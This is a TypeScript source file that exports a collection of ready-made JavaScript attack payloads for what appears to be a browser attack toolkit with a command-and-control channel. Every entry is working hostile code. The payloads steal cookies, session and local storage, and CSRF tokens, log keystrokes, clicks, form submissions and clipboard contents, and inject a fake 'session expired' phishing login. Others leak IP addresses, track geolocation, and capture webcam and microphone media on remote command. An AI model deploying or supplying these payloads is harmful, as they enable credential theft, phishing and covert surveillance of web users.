import type { JsPayload } from '@/components/javascript-library';

export const PREMADE_PAYLOADS: JsPayload[] = [
    {
        name: "Cookie Stealer",
        description: "Grabs all non-HttpOnly cookies from the document and exfiltrates them.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    const cookies = document.cookie;
    if (cookies) {
        channel.postMessage({
            sessionId: sessionId, type: 'cookie-stealer', data: { cookies: cookies },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }
})();
`.trim(),
    },
    {
        name: "Keylogger",
        description: "Captures every key press on the page and exfiltrates it in real-time.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    document.addEventListener('keydown', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'keystroke',
            data: { key: e.key, target: e.target.name || e.target.id || e.target.tagName },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
        {
        name: "Form Submission Logger",
        description: "Intercepts all form submissions on the page and sends the captured data.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        channel.postMessage({
            sessionId: sessionId, type: 'form-submit', data: { data },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "DOM Cloner",
        description: "Captures the entire current state of the page's HTML and sends it back.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    const htmlContent = document.documentElement.outerHTML;
    channel.postMessage({
        sessionId: sessionId, type: 'dom-clone', data: { html: htmlContent },
        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
    });
})();
`.trim(),
    },
    {
        name: "Clipboard Stealer",
        description: "Reads the content of the user's clipboard when they paste into the page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    document.addEventListener('paste', async (e) => {
        const text = await navigator.clipboard.readText();
        channel.postMessage({
            sessionId: sessionId, type: 'clipboard-read', data: { pastedText: text },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "WebRTC IP Leak",
        description: "Attempts to discover the user's local IP address using WebRTC.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    try {
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = e => {
            if (!e || !e.candidate || !e.candidate.candidate) return;
            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
            if (ipMatch) {
                channel.postMessage({
                    sessionId: sessionId, type: 'webrtc-ip', data: { localIp: ipMatch[1] },
                    timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
                });
                pc.onicecandidate = null;
            }
        };
    } catch (e) {
        // WebRTC might be blocked
    }
})();
`.trim(),
    },
     {
        name: "Session Data Hijacker",
        description: "Exfiltrates cookies, localStorage, and sessionStorage from the page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    channel.postMessage({
        sessionId: sessionId, type: 'session-hijack',
        data: {
            cookie: document.cookie,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage }
        },
        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
    });
})();
`.trim(),
    },
    {
        name: "Keylogger + Screenshot Combo",
        description: "Captures keystrokes and periodically sends screenshots of the page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);

    document.addEventListener('keydown', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'keystroke',
            data: { key: e.key },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    });

    setInterval(() => {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            if (ctx) {
                ctx.drawWindow(window, 0, 0, window.innerWidth, window.innerHeight, 'rgb(255,255,255)');
                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
                 channel.postMessage({
                    sessionId: sessionId, type: 'screenshot',
                    data: { screenshot: dataUrl },
                    timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
                });
            }
        } catch(e) { /* html2canvas might be better but is a large dependency */ }
    }, 10000); // Screenshot every 10 seconds
})();
`.trim(),
    },
    {
        name: "Beacon Tracker Ping",
        description: "Sends a simple 'ping' to the C2 channel, confirming the user is active on the page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    channel.postMessage({
        sessionId: sessionId, type: 'beacon-ping',
        data: { message: 'User is active.' },
        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
    });
})();
`.trim(),
    },
    {
        name: "CSRF Token Stealer",
        description: "Searches the DOM for common CSRF token patterns and exfiltrates the value.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    const tokenEl = document.querySelector('input[name=csrf_token], input[name=__RequestVerificationToken], meta[name=csrf-token]');
    if (tokenEl) {
        const token = tokenEl.value || tokenEl.content;
        channel.postMessage({
            sessionId: sessionId, type: 'csrf-token',
            data: { tokenName: tokenEl.name || 'meta-tag', tokenValue: token },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }
})();
`.trim(),
    },
    {
        name: "Phishing Overlay Injector",
        description: "Injects a fake 'session expired' login form over the entire page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);

    const overlay = document.createElement('div');
    overlay.style = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;';
    overlay.innerHTML = \`<div style="background:white;padding:2rem;border-radius:8px;text-align:center;">
        <h3>Session Expired</h3>
        <p>Please log in again to continue.</p>
        <form id="phish-form" style="display:flex;flex-direction:column;gap:1rem;margin-top:1rem;">
            <input name="username" placeholder="Username" style="padding:0.5rem;border:1px solid #ccc;border-radius:4px;">
            <input name="password" type="password" placeholder="Password" style="padding:0.5rem;border:1px solid #ccc;border-radius:4px;">
            <button type="submit" style="padding:0.5rem;background:#333;color:white;border:none;border-radius:4px;cursor:pointer;">Login</button>
        </form>
    </div>\`;
    document.body.appendChild(overlay);

    document.getElementById('phish-form').addEventListener('submit', (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        channel.postMessage({
            sessionId: sessionId, type: 'phishing-overlay-submit', data: { data },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
        overlay.innerHTML = '<h3 style="color:white;">Thank you. Your session has been restored.</h3>';
        setTimeout(() => overlay.remove(), 2000);
    });
})();
`.trim(),
    },
    {
        name: "Browser Fingerprinter",
        description: "Collects detailed browser and device characteristics to uniquely identify the user's system.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        screenResolution: screen.width + 'x' + screen.height,
        colorDepth: screen.colorDepth,
        timezoneOffset: new Date().getTimezoneOffset(),
        plugins: Array.from(navigator.plugins).map(p => p.name)
    };
    channel.postMessage({
        sessionId: sessionId, type: 'fingerprint',
        data: fingerprint,
        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
    });
})();
`.trim(),
    },
    {
        name: "Click Logger",
        description: "Logs every click on the page, including coordinates and the clicked element.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
     document.addEventListener('click', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'click', 
            data: { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "Geolocation Tracker",
        description: "Requests the user's location and sends the coordinates back.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                exfiltrate('location', { 
                    latitude: position.coords.latitude, 
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                });
            },
            (error) => {
                exfiltrate('location', { error: error.message });
            }
        );
    } else {
        exfiltrate('location', { error: 'Geolocation is not supported by this browser.' });
    }
})();
`.trim(),
    },
    {
        name: "Full Recon Payload",
        description: "The default payload that captures keystrokes, clicks, mouse movement, and form submissions.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        const payload = {
            sessionId: sessionId, type: type, data: data,
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        };
        channel.postMessage(payload);
    }

    exfiltrate('connection', { message: 'Payload activated on page.' });

    document.addEventListener('keydown', (e) => {
        exfiltrate('keystroke', { key: e.key, target: e.target.name || e.target.id || e.target.tagName });
    }, true);

    document.addEventListener('click', (e) => {
        exfiltrate('click', { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName });
    }, true);

    let lastMove = 0;
    document.addEventListener('mousemove', (e) => {
        if (Date.now() - lastMove > 200) {
            exfiltrate('mousemove', { x: e.clientX, y: e.clientY });
            lastMove = Date.now();
        }
    });

    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        exfiltrate('form-submit', { data });
    }, true);
})();
`.trim(),
    },
    {
        name: "Device Access & C2",
        description: "Requests webcam/mic access and listens for C2 commands to stream media.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    let mediaStream = null;
    let videoRecorder = null;
    let audioRecorder = null;
    let snapshotInterval = null;

    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    function blobToDataURL(blob) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onloadend = () => resolve(reader.result);
            reader.onerror = reject;
            reader.readAsDataURL(blob);
        });
    }

    async function getMediaPermissions(video = true, audio = true) {
        try {
            if (mediaStream && mediaStream.active) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
            exfiltrate('media-stream', { type: 'status', message: 'Permissions granted.' });
            return mediaStream;
        } catch (err) {
            exfiltrate('media-stream', { type: 'status', message: 'Permissions denied: ' + err.name });
            return null;
        }
    }
    
    function stopStream() {
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }
        stopSnapshotting();
        if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
        if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
        exfiltrate('media-stream', { type: 'status', message: 'Stream stopped.' });
    }

    function startSnapshotting(stream) {
        if (snapshotInterval) clearInterval(snapshotInterval);
        const videoTrack = stream.getVideoTracks()[0];
        if (!videoTrack) return;
        const imageCapture = new ImageCapture(videoTrack);

        snapshotInterval = setInterval(async () => {
            try {
                if(stream.active && stream.getVideoTracks()[0].readyState === 'live') {
                    const blob = await imageCapture.takePhoto();
                    const dataUrl = await blobToDataURL(blob);
                    exfiltrate('media-stream', { type: 'image-snapshot', snapshot: dataUrl });
                }
            } catch (e) {
                // Ignore errors if the stream is closed
            }
        }, 500); // Send snapshot every 500ms
    }

    function stopSnapshotting() {
        if (snapshotInterval) {
            clearInterval(snapshotInterval);
            snapshotInterval = null;
        }
    }
    
    function createRecorder(stream, mimeType) {
        let recordedChunks = [];
        const recorder = new MediaRecorder(stream, { mimeType });
        
        recorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        recorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            const dataUrl = await blobToDataURL(blob);
            exfiltrate('media-stream', { type: mimeType, dataUrl });
            recordedChunks = [];
        };
        return recorder;
    }

    channel.addEventListener('message', async (event) => {
        if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
        
        const { command } = event.data;
        
        if (command === 'start-video') {
            const stream = await getMediaPermissions(true, true);
            if (stream) startSnapshotting(stream);
            return;
        }

        if (command === 'start-mic') {
            await getMediaPermissions(false, true);
            return;
        }
        
        if (command === 'stop-stream') {
            stopStream();
            return;
        }

        if (!mediaStream || !mediaStream.active) {
             exfiltrate('media-stream', { type: 'status', message: 'No active media stream.' });
             return;
        }
        
        switch (command) {
            case 'capture-image':
                const videoTrack = mediaStream.getVideoTracks()[0];
                if (videoTrack) {
                    const imageCapture = new ImageCapture(videoTrack);
                    const blob = await imageCapture.takePhoto();
                    const dataUrl = await blobToDataURL(blob);
                    exfiltrate('media-stream', { type: 'image/png', dataUrl });
                }
                break;
            case 'start-video-record':
                if (mediaStream.getVideoTracks().length > 0) {
                    videoRecorder = createRecorder(mediaStream, 'video/webm');
                    videoRecorder.start();
                }
                break;
            case 'stop-video-record':
                if (videoRecorder) videoRecorder.stop();
                break;
            case 'start-audio-record':
                 if (mediaStream.getAudioTracks().length > 0) {
                    audioRecorder = createRecorder(mediaStream, 'audio/webm');
                    audioRecorder.start();
                }
                break;
            case 'stop-audio-record':
                if (audioRecorder) audioRecorder.stop();
                break;
        }
    });

    exfiltrate('connection', { message: 'Device Access Payload loaded.' });
})();
`.trim(),
    }
];
